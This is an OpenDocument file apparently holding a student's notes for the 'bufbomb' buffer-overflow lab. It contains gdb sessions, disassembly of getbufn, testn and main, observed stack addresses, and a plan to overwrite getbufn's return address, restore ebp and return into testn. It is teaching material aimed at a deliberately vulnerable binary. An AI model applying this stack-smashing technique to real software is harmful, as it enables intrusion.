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fo:color="#FF0000"/>
    </style:style>
    <style:style style:name="T3" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties fo:color="#FF0000"/>
    </style:style>
    <style:style style:name="T4" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties fo:color="#FF0000"/>
    </style:style>
    <style:style style:name="T5" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties fo:color="#FF0000"/>
    </style:style>
    <style:style style:name="T6" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties fo:color="#FF0000"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text text:use-soft-page-breaks="true">
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb</text:p>
      <text:p text:style-name="Standard">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</text:p>
      <text:p text:style-name="Standard">Copyright (C) 2014 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="Standard">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="Standard">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="Standard">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="Standard">and "show warranty" for details.</text:p>
      <text:p text:style-name="Standard">This GDB was configured as "i686-linux-gnu".</text:p>
      <text:p text:style-name="Standard">Type "show configuration" for configuration details.</text:p>
      <text:p text:style-name="Standard">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</text:p>
      <text:p text:style-name="Standard">Find the GDB manual and other documentation resources online at:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</text:p>
      <text:p text:style-name="Standard">For help, type "help".</text:p>
      <text:p text:style-name="Standard">Type "apropos word" to search for commands related to "word"...</text:p>
      <text:p text:style-name="Standard">Reading symbols from bufbomb...done.</text:p>
      <text:p text:style-name="Standard">(gdb) b getbufn</text:p>
      <text:p text:style-name="Standard">Breakpoint 1 at 0x8048c8f</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function getbufn:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c86 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c87 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c89 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x218,%esp</text:p>
      <text:p text:style-name="Standard">=&gt; 0x08048c8f &lt;+9&gt;:<text:tab/>lea <text:s text:c="3"/>-0x208(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c95 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c98 &lt;+18&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c9d &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca2 &lt;+28&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca3 &lt;+29&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">0x55683198</text:span><text:s/>&lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abc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<text:span text:style-name="T3">0x55683208</text:span><text:s/>&lt;_reserved+1036808&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcd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<text:span text:style-name="T4">0x55683158</text:span><text:s/>&lt;_reserved+1036632&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcde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<text:span text:style-name="T5">0x55683178</text:span><text:s/>&lt;_reserved+1036664&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdef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<text:span text:style-name="T6">0x55683128</text:span><text:s/>&lt;_reserved+1036584&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefg</text:p>
      <text:p text:style-name="Standard">Dud: getbufn returned 0x1</text:p>
      <text:p text:style-name="Standard">Better luck next time</text:p>
      <text:p text:style-name="Standard">[Inferior 1 (process 4054) exited normally]</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">No registers.</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function getbufn:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c86 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c87 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c89 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x218,%esp</text:p>
      <text:p text:style-name="Standard">=&gt; 0x08048c8f &lt;+9&gt;:<text:tab/>lea <text:s text:c="3"/>-0x208(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c95 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c98 &lt;+18&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c9d &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca2 &lt;+28&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca3 &lt;+29&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefgh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208 &lt;_reserved+1036808&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghi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158 &lt;_reserved+1036632&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghij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178 &lt;_reserved+1036664&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghijk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128 &lt;_reserved+1036584&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghijk</text:p>
      <text:p text:style-name="Standard">Dud: getbufn returned 0x1</text:p>
      <text:p text:style-name="Standard">Better luck next time</text:p>
      <text:p text:style-name="Standard">[Inferior 1 (process 4069) exited normally]</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">No registers.</text:p>
      <text:p text:style-name="Standard">(gdb)</text:p>
      <text:p text:style-name="Standard">$eax address in the order of:</text:p>
      <text:p text:style-name="Standard">0x55683198</text:p>
      <text:p text:style-name="Standard"><text:tab/><text:s text:c="2"/>208</text:p>
      <text:p text:style-name="Standard"><text:tab/><text:s text:c="2"/>158</text:p>
      <text:p text:style-name="Standard"><text:tab/><text:s text:c="2"/>178</text:p>
      <text:p text:style-name="Standard"><text:tab/><text:s text:c="2"/>128</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">the last 15+4+4=23 Byte are of importance</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">0x128-&gt;0x330(0x128+0x208)</text:p>
      <text:p text:style-name="Standard">0x208-&gt;0x410(0x208+0x208)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">so I can choose 0x208-&gt;0x330-23 to ret back to</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">so I choose 0x208, that is 0x55683208</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">so then I choose another 0x55683230</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">step 1. replace $eax, which is $ebp-0x208</text:p>
      <text:p text:style-name="Standard"><text:tab/>there are five cases</text:p>
      <text:p text:style-name="Standard">step 2. restore $ebp(storing old ebp, which is the ebp in testn)</text:p>
      <text:p text:style-name="Standard">step 3. ret back to &lt;testn&gt; 's next instruction</text:p>
      <text:p text:style-name="Standard"><text:tab/>0x8048ccf</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">return to 55683128</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>8048cbc:<text:tab/>55 <text:s text:c="18"/><text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cbd:<text:tab/>89 e5 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cbf:<text:tab/>53 <text:s text:c="18"/><text:tab/>push <text:s text:c="2"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cc0:<text:tab/>83 ec 24 <text:s text:c="12"/><text:tab/>sub <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cc3:<text:tab/>c7 45 f4 ef be ad de<text:s/><text:tab/>movl <text:s text:c="2"/>$0xdeadbeef,-0xc(%ebp)</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cca:<text:tab/>e8 b7 ff ff ff <text:s text:c="6"/><text:tab/>call <text:s text:c="2"/>8048c86 &lt;getbufn&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>8048ccf:<text:tab/>89 c3 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%eax,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cd1:<text:tab/>8b 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0xc(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cd4:<text:tab/>3d ef be ad de <text:s text:c="6"/><text:tab/>cmp <text:s text:c="3"/>$0xdeadbeef,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>8048cd9:<text:tab/>74 0e <text:s text:c="15"/><text:tab/>je <text:s text:c="4"/>8048ce9 &lt;testn+0x2d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$(ebp-0xc)=$0xdeadbeef</text:p>
      <text:p text:style-name="Standard">call</text:p>
      <text:p text:style-name="Standard">$ebx=$eax</text:p>
      <text:p text:style-name="Standard">$eax=$(ebp-0xc)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">&lt;main&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>80490aa:<text:tab/>bb 00 00 00 00 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x0,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s/>80490af:<text:tab/>89 f8 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%edi,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>80490b1:<text:tab/>03 04 9e <text:s text:c="12"/><text:tab/>add <text:s text:c="3"/>(%esi,%ebx,4),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>80490b4:<text:tab/>89 44 24 04 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s/>80490b8:<text:tab/>8b 44 24 18 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>80490bc:<text:tab/>89 04 24 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s/>80490bf:<text:tab/>e8 53 fd ff ff <text:s text:c="6"/><text:tab/>call <text:s text:c="2"/>8048e17 &lt;launcher&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>80490c4:<text:tab/>83 c3 01 <text:s text:c="12"/><text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s/>80490c7:<text:tab/>3b 5c 24 1c <text:s text:c="9"/><text:tab/>cmp <text:s text:c="3"/>0x1c(%esp),%ebx</text:p>
      <text:p text:style-name="Standard"><text:s/>80490cb:<text:tab/>7c e2 <text:s text:c="15"/><text:tab/>jl <text:s text:c="4"/>80490af &lt;main+0x1c7&gt;</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">for($ebx=0;$ebx&lt;$(sp+0x1c);$ebx++;)</text:p>
      <text:p text:style-name="Standard">{</text:p>
      <text:p text:style-name="Standard"><text:tab/>$eax=$edi;</text:p>
      <text:p text:style-name="Standard"><text:tab/>$eax+=$esi+4*$ebx;</text:p>
      <text:p text:style-name="Standard"><text:tab/>//$esi=0</text:p>
      <text:p text:style-name="Standard"><text:tab/>$esp+0x4=$eax;//$esp+0x4=0x4</text:p>
      <text:p text:style-name="Standard"><text:tab/>$eax=$esp+0x18;//$eax=1;</text:p>
      <text:p text:style-name="Standard"><text:tab/>$esp=$eax;//$esp=1;</text:p>
      <text:p text:style-name="Standard"><text:tab/>call launcher;</text:p>
      <text:p text:style-name="Standard">}</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f94 &lt;+172&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f97 &lt;+175&gt;:<text:tab/>call <text:s text:c="2"/>0x8049e4d &lt;gencookie&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f9c &lt;+180&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1c4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa1 &lt;+185&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa3 &lt;+187&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1b8</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fad &lt;+197&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048faf &lt;+199&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1bc</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fb9 &lt;+209&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbb &lt;+211&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbd &lt;+213&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fc2 &lt;+218&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a004,0x8(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fca &lt;+226&gt;:<text:tab/>mov <text:s text:c="3"/>%esi,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fce &lt;+230&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd1 &lt;+233&gt;:<text:tab/>call <text:s text:c="2"/>0x8048930 &lt;getopt@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd6 &lt;+238&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd8 &lt;+240&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xff,%al</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fda &lt;+242&gt;:<text:tab/>jne <text:s text:c="3"/>0x8048f54 &lt;main+108&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe0 &lt;+248&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe7 &lt;+255&gt;:<text:tab/>jne <text:s text:c="3"/>0x8049002 &lt;main+282&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe9 &lt;+257&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048feb &lt;+259&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fef &lt;+263&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a1e8,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ff6 &lt;+270&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffb &lt;+275&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffd &lt;+277&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049002 &lt;+282&gt;:<text:tab/>call <text:s text:c="2"/>0x80492e5 &lt;initialize_bomb&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049007 &lt;+287&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1b4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804900d &lt;+293&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049011 &lt;+297&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a00b,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049018 &lt;+304&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804901d &lt;+309&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049023 &lt;+315&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049027 &lt;+319&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a017,(%esp)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804902e &lt;+326&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049033 &lt;+331&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049039 &lt;+337&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804903c &lt;+340&gt;:<text:tab/>call <text:s text:c="2"/>0x8048990 &lt;srandom@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049041 &lt;+345&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049046 &lt;+350&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049048 &lt;+352&gt;:<text:tab/>and <text:s text:c="3"/>$0xff0,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804904e &lt;+358&gt;:<text:tab/>add <text:s text:c="3"/>$0x100,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049054 &lt;+364&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804905c &lt;+372&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049060 &lt;+376&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049063 &lt;+379&gt;:<text:tab/>call <text:s text:c="2"/>0x80488b0 &lt;calloc@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049068 &lt;+384&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804906a &lt;+386&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,(%eax)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049070 &lt;+392&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049075 &lt;+397&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490a3 &lt;main+443&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049077 &lt;+399&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804907c &lt;+404&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,0x14(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049080 &lt;+408&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049084 &lt;+412&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049089 &lt;+417&gt;:<text:tab/>and <text:s text:c="3"/>$0xf0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804908e &lt;+422&gt;:<text:tab/>mov <text:s text:c="3"/>$0x80,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049093 &lt;+427&gt;:<text:tab/>sub <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049095 &lt;+429&gt;:<text:tab/>mov <text:s text:c="3"/>%edx,(%esi,%ebx,4)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049098 &lt;+432&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909b &lt;+435&gt;:<text:tab/>cmp <text:s text:c="3"/>%edi,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909d &lt;+437&gt;:<text:tab/>jl <text:s text:c="4"/>0x8049084 &lt;main+412&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909f &lt;+439&gt;:<text:tab/>mov <text:s text:c="3"/>0x14(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a3 &lt;+443&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a8 &lt;+448&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490cd &lt;main+485&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490aa &lt;+450&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490af &lt;+455&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,%eax</text:p>
      <text:p text:style-name="Standard">=&gt; 0x080490b1 &lt;+457&gt;:<text:tab/>add <text:s text:c="3"/>(%esi,%ebx,4),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b4 &lt;+460&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b8 &lt;+464&gt;:<text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bc &lt;+468&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bf &lt;+471&gt;:<text:tab/>call <text:s text:c="2"/>0x8048e17 &lt;launcher&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c4 &lt;+476&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c7 &lt;+479&gt;:<text:tab/>cmp <text:s text:c="3"/>0x1c(%esp),%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cb &lt;+483&gt;:<text:tab/>jl <text:s text:c="4"/>0x80490af &lt;main+455&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cd &lt;+485&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d2 &lt;+490&gt;:<text:tab/>add <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d5 &lt;+493&gt;:<text:tab/>pop <text:s text:c="3"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d6 &lt;+494&gt;:<text:tab/>pop <text:s text:c="3"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d7 &lt;+495&gt;:<text:tab/>pop <text:s text:c="3"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d8 &lt;+496&gt;:<text:tab/>mov <text:s text:c="3"/>%ebp,%esp</text:p>
